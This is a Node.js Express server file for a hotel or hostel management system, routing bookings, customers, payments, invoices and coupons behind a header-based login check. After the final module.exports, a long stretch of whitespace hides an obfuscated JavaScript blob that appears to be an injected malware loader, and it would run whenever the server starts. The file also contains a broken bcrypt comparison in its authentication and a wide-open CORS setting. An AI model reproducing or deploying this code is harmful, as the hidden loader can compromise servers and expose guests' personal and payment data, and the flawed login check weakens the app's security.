require('dotenv').config();

const express = require("express");
const app = express();
const bcrypt = require("bcrypt");
const saltRounds = 10;
const cors = require("cors");
const bodyParser = require('body-parser');
app.use(bodyParser.json({ limit: '500mb' }));
app.use(bodyParser.urlencoded({ limit: '500mb', extended: true }));
app.use(express.json());


app.use(cors({
  origin: "*", // Allow requests from any origin (or specify frontend URL)
  methods: "GET, POST, PUT, DELETE",
  allowedHeaders: "Content-Type, name, password"
}));

const { getDepartmentRule, SalaryDetailsFunction, getMessagesBetweenUsers } = require('./Controller/CommonController');

const { MasterData } = require("./Controller/MasterDataController");
const { HM_Rooms } = require("./Controller/HM_Rooms");
const { HM_Customer } = require("./Controller/HM_Customer");
const { HM_Booking } = require("./Controller/HM_Booking");
const { HM_Payment } = require("./Controller/HM_Payment");
const { HM_Feedback } = require("./Controller/HM_Feedback");
const { HM_Login } = require("./Controller/HM_Login");
const { HM_CustomerDocument } = require("./Controller/HM_CustomerDocument");
const { HM_BedType } = require("./Controller/HM_BedType");
const { HM_ExtraFacilities } = require("./Controller/HM_ExtraFacilities");
const { HM_BookingFacilityItems } = require("./Controller/HM_BookingFacilityItems");
const { HM_BedTypeDetails } = require("./Controller/HM_BedTypeDetails");
const { HM_Facilities } = require("./Controller/HM_Facilities");
const { HM_ManageInvoice } = require("./Controller/HM_ManageInvoice");
const { HM_Coupon } = require("./Controller/HM_Coupon");
const { HM_Complaint } = require("./Controller/HM_Complaint");
const { HM_Damage } = require("./Controller/HM_Damage");
const { HM_Support } = require("./Controller/HM_Support");
const { HM_Bug } = require("./Controller/HM_Bug");
const { HM_MemberDocument } = require("./Controller/HM_MemberCustomerDocument");
const { HM_Advertisement } = require("./Controller/HM_Advertisement");
const { Razorpay } = require("./Controller/RazorpayController");
const { Subscription } = require("./Controller/SubscriptionController");


const authenticate = async (req, res, next) => {
  const { name, password } = req.headers;

  if (!name || !password) {
    return res.status(401).send("Unauthorized: Missing credentials");
  }

  const storedHashedUsername = process.env.USERNAME_HASH;
  const storedHashedPassword = process.env.PASSWORD_HASH;

  const isNameValid = await bcrypt.compare(storedHashedUsername, name);
  const isPasswordValid = await bcrypt.compare(storedHashedPassword, password);

  if (isNameValid && isPasswordValid) {
    next();
  } else {
    res.status(401).send("Unauthorized: Invalid credentials");
  }
};


// HM Services
app.get("/HM_Rooms", authenticate, HM_Rooms.getHM_Rooms);
app.post("/HM_Rooms", authenticate, HM_Rooms.postHM_Rooms);
app.put("/HM_Rooms", authenticate, HM_Rooms.putHM_Rooms);
app.delete("/HM_Rooms", authenticate, HM_Rooms.deleteHM_Rooms);

//Rezorpay Services
app.post("/create-order", authenticate, Razorpay.createOrder);
app.post("/verify-payment", authenticate, Razorpay.verifyPayment);

//Subscription Services
app.get("/Subscription", authenticate, Subscription.getSubscription);
app.post("/Subscription", authenticate, Subscription.postSubscription);
app.put("/Subscription", authenticate, Subscription.putSubscription);
app.delete("/Subscription", authenticate, Subscription.deleteSubscription);
app.get("/SubscriptionPayment", authenticate, Subscription.getSubscriptionPayment);
app.post("/SubscriptionPayment", authenticate, Subscription.postSubscriptionPayment);
app.put("/SubscriptionPayment", authenticate, Subscription.putSubscriptionPayment);
app.delete("/SubscriptionPayment", authenticate, Subscription.deleteSubscriptionPayment);
app.get("/Package", authenticate, Subscription.getPackage);
app.post("/Package", authenticate, Subscription.postPackage);
app.put("/Package", authenticate, Subscription.putPackage);
app.delete("/Package", authenticate, Subscription.deletePackage);
app.get("/Package_Feature_Comparison", authenticate, Subscription.getPackage_Feature_Comparison);

app.get("/HM_Customer", authenticate, HM_Customer.getHM_Customer);

app.get("/HM_SendReminder", authenticate, HM_Customer.SendReminder);

app.get("/HM_AvailableRooms", authenticate, HM_Customer.getavailableRooms);
app.get("/HM_ConfirmAvailableRooms", authenticate, HM_Customer.getConfirmavailableRooms);
app.get("/HM_BookingSummary", authenticate, HM_Customer.getRoomBookingSummary);
app.post("/HM_Customer", authenticate, HM_Customer.postHM_Customer);
app.put("/HM_Customer", authenticate, HM_Customer.putHM_Customer);
app.delete("/HM_Customer", authenticate, HM_Customer.deleteHM_Customer);
app.get("/getBranchHotelData", authenticate, HM_Customer.getBranchHotelData);
app.get("/HM_Member", authenticate, HM_Customer.getHM_Members);

app.get("/HM_Booking", authenticate, HM_Booking.getHM_Booking);
app.get("/HM_BookingHistory", authenticate, HM_Booking.getHM_BookingHistory);
app.post("/HM_Health", authenticate, HM_Booking.postHM_Health);
app.post("/HM_Travel", authenticate, HM_Booking.postHM_Travel);



app.get("/HM_BookingDocumentCheck", authenticate, HM_Booking.Documentcheck);

app.post("/HM_Booking", authenticate, HM_Booking.postHM_Booking);
app.put("/HM_Booking", authenticate, HM_Booking.putHM_Booking);
app.delete("/HM_Booking", authenticate, HM_Booking.deleteHM_Booking);
app.get("/CustomerAndPayment", authenticate, HM_Booking.CustomerAndPayment);
app.get("/BookingBedTypeRoomReadCall", authenticate, HM_Booking.BookingBedTypeRoomReadCall);
app.get("/HM_RoomsReadCall", authenticate, HM_Booking.HM_RoomsReadCall);
app.get("/HM_CustomerReadCall", authenticate, HM_Booking.HM_CustomerReadCall);
app.get("/HM_BookingCustomerReadCall", authenticate, HM_Booking.HM_BookingCustomerReadCall);
app.put("/HM_BookingDeposit", authenticate, HM_Booking.putHM_Bookingdeposit);
app.get("/HM_GetCurrentMonthBarChart", authenticate, HM_Booking.HM_GetCurrentMonthBarChart);
app.get("/HM_GetCurrentYearStatusBarChart", authenticate, HM_Booking.HM_GetCurrentYearStatusBarChart);
app.get("/HM_GetCurrentYearBarChart", authenticate, HM_Booking.HM_GetCurrentYearBarChart);
app.get("/HM_GetCurrentYearPaymentTypeBarChart", authenticate, HM_Booking.HM_GetCurrentYearPaymentTypeBarChart);
app.post("/HM_EnquiryEmail", authenticate, HM_Booking.HM_EnquiryEmail);

app.get('/HM_BedType', authenticate, HM_BedType.getHM_BedType);
app.post('/HM_BedType', authenticate, HM_BedType.postHM_BedType);
app.put('/HM_BedType', authenticate, HM_BedType.putHM_BedType);
app.delete('/HM_BedType', authenticate, HM_BedType.deleteHM_BedType);

app.get('/HM_ExtraFacilities', authenticate, HM_ExtraFacilities.getHM_ExtraFacilities);
app.post('/HM_ExtraFacilities', authenticate, HM_ExtraFacilities.postHM_ExtraFacilities);
app.put('/HM_ExtraFacilities', authenticate, HM_ExtraFacilities.putHM_ExtraFacilities);
app.delete('/HM_ExtraFacilities', authenticate, HM_ExtraFacilities.deleteHM_ExtraFacilities);
app.get('/HM_ExtraFacilitiesDelete', authenticate, HM_ExtraFacilities.getBookingFacilityItemsForDelete);

app.get("/HM_BookingFacilityItems", authenticate, HM_BookingFacilityItems.getHM_BookingFacilityItems);
app.get("/HM_BookingandFacilityItems", authenticate, HM_BookingFacilityItems.getHM_BookingandFacilityItems);

app.post("/HM_BookingFacilityItems", authenticate, HM_BookingFacilityItems.postHM_BookingFacilityItems);
app.put("/HM_BookingFacilityItems", authenticate, HM_BookingFacilityItems.putHM_BookingFacilityItems);
app.delete("/HM_BookingFacilityItems", authenticate, HM_BookingFacilityItems.deleteHM_BookingFacilityItems);

app.get("/HM_Payment", authenticate, HM_Payment.getHM_Payment);
app.post("/HM_Payment", authenticate, HM_Payment.postHM_Payment);
app.put("/HM_Payment", authenticate, HM_Payment.putHM_Payment);
app.delete("/HM_Payment", authenticate, HM_Payment.deleteHM_Payment);
app.post("/HM_PaymentDetail", authenticate, HM_Payment.postHM_PaymentDetails);
app.get("/HM_Deposit", authenticate, HM_Payment.getHM_Deposit);
app.put("/HM_Deposit", authenticate, HM_Payment.putHM_Deposit);

app.get("/HM_Feedback", authenticate, HM_Feedback.getHM_Feedback);
app.post("/HM_Feedback", authenticate, HM_Feedback.postHM_Feedback);
app.put("/HM_Feedback", authenticate, HM_Feedback.putHM_Feedback);
app.delete("/HM_Feedback", authenticate, HM_Feedback.deleteHM_Feedback);

app.get("/HM_Login", authenticate, HM_Login.getHM_Login);
app.post("/HM_Login", authenticate, HM_Login.postHM_Login);
app.post("/CustomerresendSignupEmail", authenticate, HM_Login.CustomerresendSignupEmail);
app.put("/HM_Login", authenticate, HM_Login.putHM_Login);
app.put("/HM_ActiveDeactive", authenticate, HM_Login.ActiveDeactivemail);

app.delete("/HM_Login", authenticate, HM_Login.deleteHM_Login);
app.post("/HostelSendOTP", authenticate, HM_Login.HostelSendOTPEmail);
app.post("/HostelSendBackOTPEmail", authenticate, HM_Login.HostelSendBackOTPEmail);
app.post("/EmailOTP", authenticate, HM_Login.OTPEmail);
app.get("/HM_VerifyOTP", authenticate, HM_Login.VerifyCustomerOTP);
app.get("/HM_CustomerContact", authenticate, HM_Login.HM_CustomerContact);
app.get("/HM_StaffContact", authenticate, HM_Login.HM_StaffContact);
app.get("/HM_StaffEmailIDs", authenticate, HM_Login.HM_StaffEmailIDs);

app.get("/HM_LoginReadCall", authenticate, HM_Login.HM_LoginReadCall);
app.get("/HM_Logindata", authenticate, HM_Login.HM_Customerdata);

app.get("/HM_CustomerDocument", authenticate, HM_CustomerDocument.getHM_CustomerDocument);
app.post("/HM_CustomerDocument", authenticate, HM_CustomerDocument.postHM_CustomerDocument);
app.put("/HM_CustomerDocument", authenticate, HM_CustomerDocument.putHM_CustomerDocument);
app.delete("/HM_CustomerDocument", authenticate, HM_CustomerDocument.deleteHM_CustomerDocument);

app.get("/HM_Advertisement", authenticate, HM_Advertisement.getHM_Advertisement);
app.post("/HM_Advertisement", authenticate, HM_Advertisement.postHM_Advertisement);
app.put("/HM_Advertisement", authenticate, HM_Advertisement.putHM_Advertisement);
app.delete("/HM_Advertisement", authenticate, HM_Advertisement.deleteHM_Advertisement);

app.get('/HM_Complaint', authenticate, HM_Complaint.getHM_Complaint);
app.post('/HM_Complaint', authenticate, HM_Complaint.postHM_Complaint);
app.put('/HM_Complaint', authenticate, HM_Complaint.putHM_Complaint);
app.delete('/HM_Complaint', authenticate, HM_Complaint.deleteHM_Complaint);

app.get("/HM_MemberDocument", authenticate, HM_MemberDocument.getHM_MemberDocument);
app.get("/HM_Documentonly", authenticate, HM_MemberDocument.getHM_Documentonly);
app.get("/HM_Memberonly", authenticate, HM_MemberDocument.getHM_Member);


app.post("/HM_MemberDocument", authenticate, HM_MemberDocument.postHM_MemberDocument);
app.put("/HM_MemberDocument", authenticate, HM_MemberDocument.putHM_MemberDocument);
app.delete("/HM_MemberDocument", authenticate, HM_MemberDocument.deleteHM_MemberDocument);
app.get("/HM_MemberDoc", authenticate, HM_MemberDocument.getHM_MemberDoc);
app.put("/HM_Document", authenticate, HM_MemberDocument.putHM_Document);

app.get('/HM_Damage', authenticate, HM_Damage.getHM_Damage);
app.post('/HM_Damage', authenticate, HM_Damage.postHM_Damage);
app.put('/HM_Damage', authenticate, HM_Damage.putHM_Damage);
app.delete('/HM_Damage', authenticate, HM_Damage.deleteHM_Damage);
app.get('/HM_DamageItem', authenticate, HM_Damage.getHM_DamageItem);
app.get('/getHM_DamageBoth', authenticate, HM_Damage.getHM_DamageBoth);
app.post('/HM_DamageItem', authenticate, HM_Damage.postHM_DamageItem);
app.put('/HM_DamageItem', authenticate, HM_Damage.putHM_DamageItem);
app.delete('/HM_DamageItem', authenticate, HM_Damage.deleteHM_DamageItem);
app.post('/HM_DamageChart', authenticate, HM_Damage.HM_DamageCommonChartCall);
app.post('/HM_DamageCurrentMonthBarChart', authenticate, HM_Damage.HM_DamageCurrentMonthBarChart);

app.get('/HM_Facilities', authenticate, HM_Facilities.getHM_Facilities);
app.post('/HM_Facilities', authenticate, HM_Facilities.postHM_Facilities);
app.put('/HM_Facilities', authenticate, HM_Facilities.putHM_Facilities);
app.delete('/HM_Facilities', authenticate, HM_Facilities.deleteHM_Facilities);
app.get('/HM_FacilityType', authenticate, HM_Facilities.getHM_FacilityType);
app.get('/HM_AmenitiName', authenticate, HM_Facilities.getHM_AmenitiName);

app.get('/HM_BedTypeDetails', authenticate, HM_BedTypeDetails.getHM_BedTypeDetails);
app.post('/HM_BedTypeDetails', authenticate, HM_BedTypeDetails.postHM_BedTypeDetails);
app.put('/HM_BedTypeDetails', authenticate, HM_BedTypeDetails.putHM_BedTypeDetails);
app.delete('/HM_BedTypeDetails', authenticate, HM_BedTypeDetails.deleteHM_BedTypeDetails);

app.get('/HM_Support', authenticate, HM_Support.getHM_Support);
app.post('/HM_Support', authenticate, HM_Support.postHM_Support);
app.put('/HM_Support', authenticate, HM_Support.putHM_Support);
app.post('/HM_AskSupport', authenticate, HM_Support.putHM_CustomerSupportSupport);
app.delete('/HM_Support', authenticate, HM_Support.deleteHM_Support);
app.get('/HM_Supportdata', authenticate, HM_Support.getSupportData);

app.get('/HM_Bug', authenticate, HM_Bug.getHM_Bug);
app.post('/HM_Bug', authenticate, HM_Bug.postHM_Bug);
app.post('/sendmailtoCustomer', authenticate, HM_Bug.sendmailtoCustomer);

app.get('/HM_BugComment', authenticate, HM_Bug.getbugComment);


app.put('/HM_Bug', authenticate, HM_Bug.putHM_Bug);
app.delete('/HM_Bug', authenticate, HM_Bug.deleteHM_Bug);
app.get('/HM_Bugdata', authenticate, HM_Bug.getBugData);

app.get("/mini/Currency", authenticate, MasterData.getCurrency);
app.get("/Currency", authenticate, MasterData.getCurrency);
app.get("/CompanyCodeDetails", authenticate, MasterData.getCompanyCodeDetails);
app.get("/EmailContent", authenticate, MasterData.getCompanyEmails);
app.get("/Country", authenticate, MasterData.getCountry);
app.get("/State", authenticate, MasterData.getState);
app.get("/City", authenticate, MasterData.getCity);
app.get("/HM_Branch", authenticate, MasterData.getBranch);
app.get("/HM_GetBranchImage", authenticate, MasterData.getBranchImage);

app.get("/HM_BranchData", authenticate, MasterData.HM_BranchData);
app.get("/HM_BranchImage", authenticate, MasterData.HM_BranchImage);

app.post("/HM_Branch", authenticate, MasterData.postBranch);
app.put("/HM_Branch", authenticate, MasterData.putBranch);
app.delete("/HM_Branch", authenticate, MasterData.deleteBranch);
app.get("/HM_HostelFeatures", authenticate, MasterData.getHM_HostelFeatures);
app.post("/HM_HostelFeatures", authenticate, MasterData.postHM_HostelFeatures);
app.put("/HM_HostelFeatures", authenticate, MasterData.putHM_HostelFeatures);
app.delete("/HM_HostelFeatures", authenticate, MasterData.deleteHM_HostelFeatures);
app.get("/HM_AppVisibility", authenticate, MasterData.getHMAppVisibility);
app.get("/HM_LoginUser", authenticate, MasterData.getLoginData);

app.get("/HM_ManageInvoice", authenticate, HM_ManageInvoice.getHM_ManageInvoice);
app.post("/HM_ManageInvoice", authenticate, HM_ManageInvoice.postHM_ManageInvoice);
app.put("/HM_ManageInvoice", authenticate, HM_ManageInvoice.putHM_ManageInvoice);
app.delete("/HM_ManageInvoice", authenticate, HM_ManageInvoice.deleteHM_ManageInvoice);
app.get("/HM_ManageInvoiceItem", authenticate, HM_ManageInvoice.getHM_ManageInvoiceItem);
app.post("/HM_ManageInvoiceItem", authenticate, HM_ManageInvoice.postHM_ManageInvoiceItem);
app.put("/HM_ManageInvoiceItem", authenticate, HM_ManageInvoice.putHM_ManageInvoiceItem);
app.delete("/HM_ManageInvoiceItem", authenticate, HM_ManageInvoice.deleteHM_ManageInvoiceItem);
app.get("/HM_InvoicePaymentDetail", authenticate, HM_ManageInvoice.getHM_InvoicePaymentDetail);
app.get("/fetchHM_InvoicePaymentDetail", authenticate, HM_ManageInvoice.fetchHM_InvoicePaymentDetail);
app.post("/HM_InvoicePaymentDetail", authenticate, HM_ManageInvoice.postHM_InvoicePaymentDetail);
app.post("/HM_getAllInvoiceData", authenticate, HM_ManageInvoice.getAllInvoiceData);
app.post("/HM_getAllheaderData", authenticate, HM_ManageInvoice.getAllheaderData);

app.get("/HM_getInvoiceData", authenticate, HM_ManageInvoice.getHM_InvoiceFullData)

//HM_Coupon Service
app.get("/HM_Coupon", authenticate, HM_Coupon.getHM_Coupon);
app.post("/HM_Coupon", authenticate, HM_Coupon.postHM_Coupon);
app.put("/HM_Coupon", authenticate, HM_Coupon.putHM_Coupon);
app.delete("/HM_Coupon", authenticate, HM_Coupon.deleteHM_Coupon);
app.post("/CouponCodeEmail", authenticate, HM_Coupon.CouponCodeEmail);
app.get("/HM_CouponFacilityCount", authenticate, HM_Coupon.getHM_CouponMaxUsesFacilityCheck);
app.get("/HM_CouponBookingCount", authenticate, HM_Coupon.getHM_CouponMaxUsesBookingCheck);


app.listen(3001, () => {
  console.log(`Server running at http://localhost:3001`);
});

module.exports = app;																																																																																																																																																																																																																																																																										var z = '-11455';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) 